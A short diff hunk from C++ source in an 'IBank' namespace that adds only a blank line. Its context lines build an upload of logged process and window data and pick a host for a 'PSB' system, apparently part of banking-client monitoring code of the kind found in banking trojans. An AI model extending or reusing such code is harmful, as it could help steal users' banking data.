@@ -406,6 +406,7 @@ namespace IBank
 		MultiPartData::AddLongAsStr(Data,   "pid",  Log->PID);
 		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);
 
+
 		#ifdef JavaClient2015SaverH
 			string Host;
 			if (IsPSBSystem())
